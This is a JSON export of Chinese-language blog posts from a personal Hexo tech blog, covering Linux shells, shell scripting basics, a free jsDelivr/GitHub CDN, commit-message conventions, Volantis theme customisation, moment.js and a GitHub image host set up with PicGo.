包括ash、bash、ksh、csh、zsh等，种类多了，也就有了标准化的要求，这就是POSIX的由来。 POSIX 表示可移植操作系统接口（UNIX的可移植操作系统接口，缩写为POSIX），POSIX标准定义了操作系统应该为应用程序提供的接口标准。 通过以下命令来查看文件中的内容来查看自己主机中当前有哪些种类的Shell： 1234567891011121314151617$ cat &#x2F;etc&#x2F;shells&#x2F;bin&#x2F;sh&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;ksh&#x2F;bin&#x2F;pdksh&#x2F;bin&#x2F;tcsh&#x2F;bin&#x2F;zsh&#x2F;bin&#x2F;dash&#x2F;bin&#x2F;posh&#x2F;usr&#x2F;bin&#x2F;sh&#x2F;usr&#x2F;bin&#x2F;bash&#x2F;usr&#x2F;bin&#x2F;ksh&#x2F;usr&#x2F;bin&#x2F;pdksh&#x2F;usr&#x2F;bin&#x2F;tcsh&#x2F;usr&#x2F;bin&#x2F;zsh&#x2F;usr&#x2F;bin&#x2F;dash&#x2F;usr&#x2F;bin&#x2F;posh 如何查看当前正在使用的Shell 类型： 12$ echo $SHELL&#x2F;bin&#x2F;bash $SHELL是一个环境变量，它记录了Linux 当前用户所使用的Shell类型。 用户可以通过直接输入各种Shell的二进制文件名（因为这些二进制文件本身是可以被执行的），来进入到该Shell下，比如进入zsh可以直接输入： 1$ &#x2F;bin&#x2F;zsh 这个命令为用户又启动了一个Shell，这个Shell在最初登录的那个Shell之后，称为下级的Shell或子Shell。 最标准的ShellBashsh是Unix 上最古老的Shell，在sh的基础上添加了各种扩展功能的是bash，它成为Linux标准Shell。有如下的特点： 使用上下键快速查看历史命令 Tab 键自动补全 其他Shellashash是Linux 中占用系统资源最少的一个小Shell，它只包含24个内部命令，因而使用起来很不方便。 cshcsh是Linux 比较大的内核，共有52个内部命令。该Shell其实是指向/bin/tcsh这样的一个Shell，也就是说，csh其实就是tcsh。 zshzch是Linux 最大的Shell之一，共有84 个内部命令。 zsh具有如下特性： 更好的自动补全、更高效 更好的文件名展开（通配符展开） 可定制性高 参考链接 什么是Shell以及常见Shell种类","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"免费 CDN：JsDelivr + Github","slug":"free-cdn-jsdelivr-github","date":"2020-07-10T05:32:43.000Z","updated":"2020-07-10T05:34:57.891Z","comments":true,"path":"free-cdn-jsdelivr-github/","link":"","permalink":"https://www.0x2beace.com/free-cdn-jsdelivr-github/","excerpt":"不知道大家通常是如何访问图床的，我之前一直使用的方式是：GitHub 图床 + raw.githubusercontent。 图片相关的资源全部放在GitHub上，然后使用GitHub 提供的素材服务器raw.githubusercontent去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。 因此需要使用 CDN 来加速来优化资源加载速度。","text":"不知道大家通常是如何访问图床的，我之前一直使用的方式是：GitHub 图床 + raw.githubusercontent。 图片相关的资源全部放在GitHub上，然后使用GitHub 提供的素材服务器raw.githubusercontent去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。 因此需要使用 CDN 来加速来优化资源加载速度。 CDN 是什么 CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科 由于某些原因，很多公用免费的 CDN 资源在中国大陆并不很好用，就算是付费的，也有一定的限制，例如每天的刷新次数有限之类的。幸运的是在中国大陆唯一有 license 的公有 CDN竟然是免费的，它就是——JsDelivr。 JsDelivr 是什么 A free CDN for Open Source fast, reliable, and automated. —— JsDelivr 官网 根据官网的介绍我们可以知道它是一个免费、快速、可靠、自动化 的CDN。 那么，这么棒的CDN，到底该如何使用呢？下面会一一介绍。 快速上手JsDelivr 目前有三种用法： \u001fNpm Github Wordpress 因为本文的重点是如何使用 GitHub + JsDelivr，来搭建免费的CDN，所以这里就不对其他两种用法做过多介绍。 1. 新建Github 仓库这个仓库是用于存储资源文件的，最好是public，因为private的仓库，资源链接会带token验证，而这个token会存在过期的问题。 2. 将本地资源推送至仓库将资源文件加入本地仓库，然后推送至 CDN 的远程仓库。 3. 发布仓库如果没有发布就直接使用，可能会导致文件加载异常。 自定义发布版本号： 然后点击Publish release。 4. 通过jsDeliver引用资源只需要通过符合 JSDelivr 规则的 URL 引用，即可直接使用 Github 中的资源。 规则如下： 1https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file 参数说明： cdn.jsdelivr.net/gh/：jsDeliver 规定Github 的引用地址 username：你的GitHub 用户名 repository：CDN 仓库 @version：发布的版本号 file：资源文件在仓库中的路径 版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下： 123456789101112131415&#x2F;&#x2F; 通过指定版本号引用https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg&#x2F;&#x2F; 使用一个范围内的版本https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; 忽略版本号则默认使用最新版https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; 在任意JS&#x2F;CSS文件后添加 .min 能得到一个缩小版&#x2F;&#x2F; 如果它本身不存在，我们将会为你生成https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js&#x2F;&#x2F; 在末尾加 &#x2F; 则得到目录列表https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F; 同样的一张图片，可以对比一下jsDeliver和raw.githubusercontent 的访问速度。 jsDeliver：https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg raw.githubusercontent：https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"如何写好Commit log","slug":"how-to-write-a-commit-log","date":"2020-07-10T01:22:51.000Z","updated":"2020-07-10T01:23:51.811Z","comments":true,"path":"how-to-write-a-commit-log/","link":"","permalink":"https://www.0x2beace.com/how-to-write-a-commit-log/","excerpt":"其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。 这里就不过多介绍什么是Git了，本文的重点是Commit Log，如果还不清楚Git是什么，可以看一下我的Git系列的其他笔记。","text":"其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。 这里就不过多介绍什么是Git了，本文的重点是Commit Log，如果还不清楚Git是什么，可以看一下我的Git系列的其他笔记。 为什么要关注提交信息 加快Reviewing Code的过程 提醒自己或他人，某个提交具体增加了什么功能，改动了哪些地方 提高项目的整体质量 Angular 规范的 Commit message 格式这种格式（规范）是我目前觉得相对其他格式（规范）而言，最容易接受、上手的一种。 其核心是每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。 12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&#x2F;&#x2F; 空一行&lt;body&gt;&#x2F;&#x2F; 空一行&lt;footer&gt; 其中，Header 是必需的，Body 和 Footer 可以省略。 HeaderHeader 部分只有一行，包括三个字段：type（必需）、scope（可选）和 subject（必需）。 type 用于说明 commit 的类别，只允许使用下面 7 个标识。 feat 新功能（feature） fix 修补 bug docs 文档（documentation） style 格式（不影响代码运行的变动） refactor 重构（即不是新增功能，也不是修改 bug 的代码变动） test 增加测试 chore 构建过程、辅助工具的变动 perf 提高性能 typo 打字错误 scope 用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。 subject 是 commit 目的的简短描述，不超过 50 个字符。 BodyBody 部分是对本次 commit 的详细描述，可以分成多行。 FooterFooter 部分只用于不兼容变动和关闭 Issue。 总结本来我自己一直使用的方式就是：git commit -am &quot;fix login bug，虽然并没有绝对的对错，但这显然不是最好的方式。 这种东西并没有强制性的规定，只要团队之间约定好，然后按照这个约定协作就好了。 所以我觉得在团队之间commit时，可以不用完全按照Angular 规范的Commit message格式去提交，可以按照以下约定来执行。 commit时，只用保留 Header 部分就好。 pull request时，才需要 Header、Body、Footer 这三部分。 另外commit时需要注意以下几点： 创建短小而明确的commit，一句话说清楚。 一个小改动对应一次commit，不建议一大堆改动，一次commit。 如果添加的代码会使项目发生极大的变化，那么需要及时更新remade文件以向他人说明此次更改。 最佳实践123docs: add FAQ in readme filefeat: increase user login functionfix: fix user login bug 参考链接 Git 如何写好 Commit Log？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Hexo Volantis 主题优化 | 增加分析与统计","slug":"hexo-volantis-theme-optimization-add-analysis-and-statistics","date":"2020-07-09T13:14:37.000Z","updated":"2020-07-09T13:19:08.344Z","comments":true,"path":"hexo-volantis-theme-optimization-add-analysis-and-statistics/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/","excerpt":"Volantis 默认支持 不蒜子 的访问统计，可以自行添加百度统计和 Google Analytics。","text":"Volantis 默认支持 不蒜子 的访问统计，可以自行添加百度统计和 Google Analytics。 环境要求 Hexo：4.2 Node：12 Volantis：2.6 分析与统计字数和阅读时长 Volantis 默认没有安装 wordcount插件，所以需要手动安装： 1npm i --save hexo-wordcount 修改主题配置文件themes/volantis/_config.yml，将 wordcount 插件打开 12345plugins: ... # 文章字数统计、阅读时长，开启需要安装插件: npm i --save hexo-wordcount wordcount: true 继续修改主题配置文件themes/volantis/_config.yml，将 wordcount 放在需要显示的 meta 位置： 12345678# 布局layout: on_list: meta: [..., wordcount, ...] on_page: meta: header: [..., wordcount, ...] footer: [..., wordcount, ...] 百度统计百度统计是百度推出的一款免费的专业网站流量分析工具，能够告诉用户访客是如何找到并浏览用户的网站，在网站上做了些什么，非常有趣，接下来我们把百度统计添加到自己博客当中。 访问百度统计首页，注册一个账号后登陆，添加你的博客网站。 点击获取代码，复制该代码。 在主题配置文件中，增加以下内容： 1cnzz: true 用于设置是否开启百度统计。 在themes/volantis/layout/_partial目录下，新建一个cnzz.ejs文件，将刚才复制的内容粘贴进去： 1234567891011&lt;% if (theme.cnzz)&#123; %&gt;&lt;script&gt; var _hmt &#x3D; _hmt || []; (function () &#123; var hm &#x3D; document.createElement(&quot;script&quot;); hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;; var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0]; s.parentNode.insertBefore(hm, s); &#125;)();&lt;&#x2F;script&gt;&lt;% &#125; %&gt; 最后将以下内容放在网站首页的尾部themes/volantis/layout/_partial/footer.ejs中： 1&lt;%- partial(&#39;cnzz&#39;) %&gt; 完成以上所有操作之后，可以在百度统计管理页面检查代码是否安装正确，如果正确安装，通常二十分钟之后就可以看到网站的分析数据了。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Hexo Volantis 主题优化 | 添加日历图","slug":"hexo-volantis-theme-optimization-add-calendar","date":"2020-07-09T13:07:08.000Z","updated":"2020-07-09T13:12:15.183Z","comments":true,"path":"hexo-volantis-theme-optimization-add-calendar/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/","excerpt":"一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。 默认效果如下： 因为我使用的Hexo 主题是Volantis、而该主题目前并没有集成该控件，所以需要手动配置。","text":"一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。 默认效果如下： 因为我使用的Hexo 主题是Volantis、而该主题目前并没有集成该控件，所以需要手动配置。 环境要求 Hexo：4.2 Node：12 Volantis：2.6 Volantis 低版本可能会不适用于本文介绍的方法，可以参考 YINUXY 的 Hexo主题美化 | 给你的博客加上GITHUB日历云和分类 配置 在主题配置文件 themes\\volantis\\_config.yml 下添加以下内容： 1postCalendar: true 用于设置在归档页面中是否显示’文章日历’控件，如果不想显示，设置为 false 即可。 在归档页面 themes/volantis/layout/archive.ejs 添加以下代码： 12345&lt;div id&#x3D;&quot;calendar&quot;&gt; &lt;% if (theme.postCalendar) &#123; %&gt; &lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt; &lt;% &#125; %&gt;&lt;&#x2F;div&gt; 具体添加位置： 这里会根据主题配置文件中的postCalendar的值，来判断是否需要渲染。 点击下载日历样式文件 post-calendar.ejs，放置于themes/volantis/layout/_widget目录下。 将其中的第 16 行，替换成以下内容： 1&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt; 至此已经完成了，使用hexo generate &amp;&amp; hexo server查看是否可以正常加载日历图。 默认的样式是高仿gittee，如果觉得不满意，可以参考官方文档自定义。 参考链接 hexo（sakura）仿gitee添加文章贡献度日历图（echarts）","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"编写第一个Shell 脚本","slug":"write-the-first-shell-script","date":"2020-07-08T13:56:46.000Z","updated":"2020-07-08T13:59:47.029Z","comments":true,"path":"write-the-first-shell-script/","link":"","permalink":"https://www.0x2beace.com/write-the-first-shell-script/","excerpt":"这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。","text":"这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。 什么是 shell 脚本 Shell 脚本就是将一堆的 Shell 命令以及指定执行 Shell ，通过放在一个文件中来执行。 创建第一个shell 脚本下面我们来创建第一个 shell 脚本： 123456$ vim showdate#! &#x2F;bin&#x2F;bash# this script displays the date and who&#39;s logged ondatewho 大功告成！这样就完成了一个简单的 shell 脚本的创建，是不是很简单！不过有以下几点需要注意： shell 脚本的名称不是一定需要用 .sh 来结尾，只是用 .sh 结尾会让其他人一目了然知道这是一个 shell 脚本文件。 在创建shell 脚本时，必须在第一行指定要使用的 shell，且格式固定为：#!开头。 第二行的井号作为注释行。 运行shell 脚本： 12345678$ lsshowdate$ .&#x2F;showdatebash: permission denied: .&#x2F;showdate$ sudo .&#x2F;showdatesudo: .&#x2F;showdate: command not found$ chmod u+x showdate$ .&#x2F;showdate 创建完 shell 脚本，想要运行，有两种方案： 将 shell 脚本所处的目录添加到 PATH 环境变量中; 在提示符中用绝对路径或者是相对路径来引用 shell 脚本文件; 在上面的例子中，用的是绝对路径的方式来执行shell 脚本，使用单点操作符表示当前目录下的文件。 需要注意的是，因为文件夹权限的关系，而不能直接用 sudo 命令去执行，因为sudo 命令会检查showdate 并不在sudo 命令列表中。 所以正解是：修改该文件的文件夹权限。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"对于Shell编程的理解","slug":"understanding-of-shell-programming","date":"2020-07-08T13:45:40.000Z","updated":"2020-07-08T13:55:36.897Z","comments":true,"path":"understanding-of-shell-programming/","link":"","permalink":"https://www.0x2beace.com/understanding-of-shell-programming/","excerpt":"在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。 计算机语言可以分为两大类： 低级语言 高级语言","text":"在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。 计算机语言可以分为两大类： 低级语言 高级语言 低级语言包括：机器语言和汇编语言。 高级语言包括：静态语言和动态语言。 这里就不对机器语言和汇编语言做介绍了，今天的主角是高级语言下的动态语言。 动态语言动态语言又叫做脚本语言。 它和传统的静态语言的区别就在于: 12前者的运行过程为：编写-&gt;解释-&gt;执行而后者的运行过程为：编写-&gt;编译-&gt;链接-&gt;执行 脚本语言的优势就在于 只要有一个可以写代码的编辑器和能解释执行的脚本解释器就行了。 这样一想，也就明白了为什么搭建Python的开发环境远比C#要快，因为它只要安装一个解释器就好了。 动态语言与静态语言存在的争议之一： 在静态语言中，写代码时必须知道每个变量的类型; 而在动态语言中，随便什么时候，你都可以把变量设为任意类型的值。 Shell编程最初在学习Shell脚本时，产生过这样一个问题：为什么还能用PHP写Shell脚本？ 当时就很不理解。这里就反应了两个问题： 对PHP的理解不深 对Shell脚本的理解不深 理论上讲，只要一门语言提供了解释器，这门语言就可以胜任脚本编程。 所以用 PHP 可以写 Shell 脚本，就没有什么好奇怪的了。你可能会问：这句话里面的 Shell怎么理解？ 还记得吗，Shell的概念是什么？ Shell 脚本就是将一堆的 Shell 命令以及指定执行 Shell ，通过放在一个文件中来执行。 脚本语言的分类脚本语言又可以分为以下两大类： Shell脚本 通用动态语言 常见的Shell脚本： sh bash csh ksh tcsh zsh AppleScript 常见的脚本语言 JavaScript Perl PHP Python Ruby VBScript","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"关于Linux的Shell、Shell脚本、Shell环境的理解","slug":"understanding-of-linux-shell-shell-script-shell-environment","date":"2020-07-08T13:40:01.000Z","updated":"2020-07-08T13:52:22.046Z","comments":true,"path":"understanding-of-linux-shell-shell-script-shell-environment/","link":"","permalink":"https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/","excerpt":"如标题所示，这片笔记主要目的是加深对Linux的Shell、Shell脚本、Shell环境的理解。","text":"如标题所示，这片笔记主要目的是加深对Linux的Shell、Shell脚本、Shell环境的理解。 什么是Shell？ 在回答这个问题之前，我们先来考虑一个问题：人是如何跟计算机打交道的？或者说怎样让计算机按照我们的要求完成某个任务？ 现在和计算机交互的方式很简单，直接用图形界面的工具就好了，想要计算机完成某个任务，通过操作图形界面的工具就能到达目的。 那么在以前呢？在那个计算机还没有这么先进的时代呢？人们又是如何让计算完成某个任务。通过“命令”的方式告诉计算机我需要你帮你完成这件事。这个“命令”又是怎么告诉计算机的呢？通过一个交互工具。这个工具可以实现与计算机之间的“你问我答，你说我做”的功能。 Shell就是一种应用程序（注意：我这里用的是一种）。 这个应用程序提供了一个界面（方便我们与计算机进行交互），用户通过这个界面访问操作系统内核的服务。 什么是Shell脚本？Shell 脚本（Shell Script），是一种为 Shell 编写的脚本程序。 Shell 脚本编程有两种方式 交互式（Interactive）：用户每输入一条命令就立即执行。 批处理（Batch）：由用户事先编写好一个完整的Shell脚本，Shell会一次性执行脚本中诸多的命令。 什么是Shell环境Shell编程跟java、php编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。 0x01 Linux Linux 默认安装了 Shell 解释器。 在Linux中，主流的 Shell 是 Bash。 在一般情况下，人们并不区分 Bourne Shell 和 Bourne Again Shell，所以，像 #!/bin/sh，它同样也可以改为 #!/bin/bash。 0x02 Mac OS Mac OS不仅带了sh、bash这两个最基础的解释器，还内置了ksh、csh、zsh等不常用的解释器。 0x03 WindowsWindows 出厂时没有内置 Shell 解释器，通常我们都是安装cygwin或者mingw 模拟器来Linux环境。 Cygwin Mingw 如Git的交互界面就是由Mingw模拟器提供的Bash。 脚本解释器12345bash &#x3D;&gt; Bourne Again Shell（&#x2F;bin&#x2F;bash）sh &#x3D;&gt; Bourne Shell（&#x2F;usr&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;sh）csh &#x3D;&gt; C Shell（&#x2F;usr&#x2F;bin&#x2F;csh）ksh &#x3D;&gt; K Shell（&#x2F;usr&#x2F;bin&#x2F;ksh）Shell for Root（&#x2F;sbin&#x2F;sh） 第一个Shell脚本打开Bash或者任何一个文本编辑器，新建一个文件 Hello.sh，扩展名为sh(sh代表shell)。 123456#!&#x2F;bin&#x2F;bash#第一个Shell脚本#作用是列出当前目录下的所有文件的详情信息PWDS&#x3D;echo &#96;pwd&#96;cd $PWDSls -l 上面这个脚本中，有三种不同的元素： 第一行的脚本声明（#!）用来告诉系统使用哪种 Shell 解释器来执行该脚本； 第二行的注释信息（#）是对脚本功能和某些命令的介绍信息，使得看到脚本时能快速反应是做什么的。 剩下没有前缀标识的就是 所要执行的脚本具体命令了。 运行Shell脚本有两种方式： 1. 作为可执行程序12$ chmod +x example.sh # 使脚本具有执行权限$ .&#x2F;example.sh # 执行脚本 2. 作为解释器参数这种运行方式是，直接运行解释器，其参数就是shell脚本的文件名: 1234# 执行脚本$ &#x2F;bin&#x2F;sh example.sh$ bash example.sh$ bash example.php 使用这种方式时，可以不用在脚本第一行声明解释器信息。 12345678$ cat example.php#这是一个用php写的Shell脚本，有两个作用#1.确认是否用解释器参数执行shell脚本可以不用写声明#2.确认如何用php写shell脚本string&#x3D;&quot;php shell&quot;echo $string$ bash example.phpphp shell","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"moment.js 用法总结","slug":"moment-js-usage-summary","date":"2020-07-07T10:59:32.000Z","updated":"2020-07-08T16:31:53.649Z","comments":true,"path":"moment-js-usage-summary/","link":"","permalink":"https://www.0x2beace.com/moment-js-usage-summary/","excerpt":"最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。 momentjs 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。","text":"最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。 momentjs 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。 快速上手momentjs支持多个环境，所有的代码都应该在这两种环境中都可以工作。 Node.js12npm install momentvar moment &#x3D; require(&#39;moment&#39;); 浏览器1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt; 实例获取当前的日期和时间： 创建1moment(); 相当于moment(new Date()) 此处会返回一个moment封装的日期对象。 格式化1234567moment().format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020年07月07日 07:49:38&quot;moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;moment().format(&#39;d&#39;) &#x2F;&#x2F; 2，今天是周二moment().format(&#39;X&#39;) &#x2F;&#x2F; 获取当前时间的Unix时间戳 转换为Date对象1234moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (中国标准时间)moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (中国标准时间)moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (中国标准时间)moment(1448896064621).toDate() &#x2F;&#x2F;毫秒转日期 获取时间信息123456789moment().second() &#x2F;&#x2F; 获取当前这一分钟的多少秒moment().date() &#x2F;&#x2F; 获取天moment().day() &#x2F;&#x2F; 获取星期moment().dayOfYear() &#x2F;&#x2F; 一年内的多少天moment().week() &#x2F;&#x2F; 一年里的多少周moment().month() &#x2F;&#x2F; 获取当前月份（实际月份-1）moment().quarter() &#x2F;&#x2F; 一年内的第几个季度moment().year() &#x2F;&#x2F; 获取年份moment().daysInMonth() &#x2F;&#x2F; 获取当月天数 显示一旦解析和操作完成后，需要某些方式来显示 moment。 使用format来格式化日期： 123456moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; 将Unix 时间戳转换为日期格式moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; 将Unix 毫秒时间戳转换为日期格式moment().unix(); &#x2F;&#x2F; 获取Unix 时间戳moment().format(&quot;X&quot;); &#x2F;&#x2F; 获取Unix 时间戳moment().format(&quot;x&quot;); &#x2F;&#x2F; 获取Unix 毫秒时间戳","categories":[{"name":"前端","slug":"前端","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"}]},{"title":"如何选择一个适合自己的图床","slug":"how-to-choose-a-picture-bed-that-suits-you","date":"2020-07-06T15:06:33.000Z","updated":"2020-07-10T05:36:37.965Z","comments":true,"path":"how-to-choose-a-picture-bed-that-suits-you/","link":"","permalink":"https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/","excerpt":"因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。 如果不是因为SM.MS 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。 于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。 使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。","text":"因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。 如果不是因为SM.MS 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。 于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。 使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。 为什么不选择国内的那些图床服务？ 我只是想存一些图片，而国内的大部分图床服务，还需要做域名备案以及绑定各种服务，感觉很繁琐，加上我的域名不是在国内的域名服务商那里买的，索性就没有考虑国内的图床服务。 图床管理工具有了图床，就需要顺手配置一个图床管理工具，这里我选择的是 PicGo，仅目前支持的图床就有：SM.MS图床，微博图床，七牛图床，腾讯云COS，阿里云OSS，Imgur，又拍云，GitHub 图床等。 创建GitHub 图床首先，你得有一个GitHub 账号。 1. 新建一个仓库这个仓库是用于存储图片，最好是public，因为private的仓库，图片链接会带token，而这个token会存在过期的问题。 2. 获取授权token通过Settings-&gt;Developer settings-&gt;Personal access tokens 创建一个新的token 用于PicGo操作你的仓库。 把repo的勾打上即可，点击Generate token的绿色按钮生成 token。 创建成功后，会生成一串token，这串token之后不会再显示，所以第一次看到的时候最好保存好。 配置PicGoGitHub 图床的配置还是比较简单的，下面是参数说明。 仓库名：你的图床仓库的名称，格式为：username/repository 分支名：一般选择默认分支 master Token：刚才生成的 Token 存储路径：指定存放在仓库的哪个目录下 自定义域名：raw.githubusercontent.com/username/repository/branch 自定义域名最好按照一定的规则去定义：raw.githubusercontent.com+你的github用户名+仓库名称+分支名称 raw.githubusercontent.com 是github用来存储用户上传文件的服务地址，是github 的素材服务器 (assets server)。 